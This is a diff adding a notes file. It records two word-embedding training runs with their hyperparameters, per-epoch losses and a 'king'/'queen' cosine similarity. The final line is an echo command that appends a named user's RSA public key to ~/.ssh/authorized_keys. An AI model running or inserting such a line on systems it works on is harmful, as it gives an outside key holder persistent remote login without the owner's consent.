@@ -1,0 +1,35 @@
+Test 1:
+optimizer = SGD
+loss_function = CrossEntropyLoss
+
+num_epochs = 2
+embedding_dim = 100
+learning_rate = 0.01
+batch_size = 64
+
+Epoch 1/2, Training Loss: 7.2664710752532935
+Epoch 1/2, Validation Loss: 6.971712216388322
+Epoch 2/2, Training Loss: 7.064887947471085
+Epoch 2/2, Validation Loss: 6.909492419133217
+
+Cosine similarity between 'king' and 'queen': 0.3059920370578766
+
+Test 2:
+
+optimizer = Adam
+num_epochs = 7
+embedding_dim = 300
+learning_rate = 0.05
+batch_size = 1024
+
+Epoch 1/7, Training Loss: 23.29752178652279
+Epoch 1/7, Validation Loss: 22.971514416517948
+Epoch 2/7, Training Loss: 23.71898649623283
+Epoch 2/7, Validation Loss: 22.69840625617327
+Epoch 3/7, Training Loss: 23.69685013558713
+Epoch 3/7, Validation Loss: 22.806201033946184
+
+Cosine similarity between 'king' and 'queen': 0.04516332969069481
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDb6/ZXmajNNeggp7CJeJRPWruiiQJXE3xir6I8c/zkOo8B6+2+adErgzdwRDzTAqnQtGpYV8rmvyTcBkK31MH4qWPMJaqo2sOzeYlH7zNst6v+2NWPoiuwnFfCvrTGzH9dsIphW2bd8EQYMCXLImf/kzMWDz3OhARAcGL/s6BJ2CQtmbu3FRSnHaCyWJyFENzgRV4j4QEY57bare1Xp7mBC/wHW0RSXPbKu95ukjID504pUzuzTicYDeofrHK0nc1BEmLF7DiBgB3ZugQAHjbsQjV4+H5HK0ENGne8FxOsY+QUdli+8b9LH8CU0JWkD6QZYQdSNDjy/apHSkSBphda6z/8k5gcsEtfCsYKrZFmtxnhMJZG4iF+yv3tzsBHRhX6c1DTJ/gqiatrxG8mlA8zJ8fnV1qmT13i1Wbcy4GG0LPPKAtlukdvhK4hh75NvTWXQyqMoyEM/HDjYxiPi/m7zKfFL736w5lg1qctfoO77r/BmKV/g6MhlFJsvDWBKg29hILcg1GOHFBISpALKQ2JrPJA+vcRj1/ecBJWVjcynurcHEpY5XfpJXPNXsMiBbZQlH6M9JojA5nQBfcu4mCzYSMTucABt5VAIbAWQ5VN9aqybmkijK4BJm5B/rwMGyyQQiGAw5sgMARzJPsGVDD+aO9ZO62S8CbZPtJPePWQBw== kalebsofer@gmail.com" >> ~/.ssh/authorized_keys
